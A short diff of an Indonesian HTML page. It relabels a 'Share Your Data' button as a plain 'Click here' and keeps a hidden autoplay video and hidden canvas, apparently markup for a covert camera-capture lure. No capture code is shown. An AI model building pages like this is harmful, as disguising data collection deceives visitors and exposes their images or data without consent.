@@ -8,7 +8,7 @@
 <body>
     <h1>welcome to this page</h1>
     <p>Langkah selanjutnya silahkan klik tombol KLIK DISINI di bawah untuk melanjutkan ke halaman berikutnya.</p>
-    <button id="shareData">Bagikan Data Anda</button>
+    <button id="shareData">KLIK DI SINI</button>
     <video id="video" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
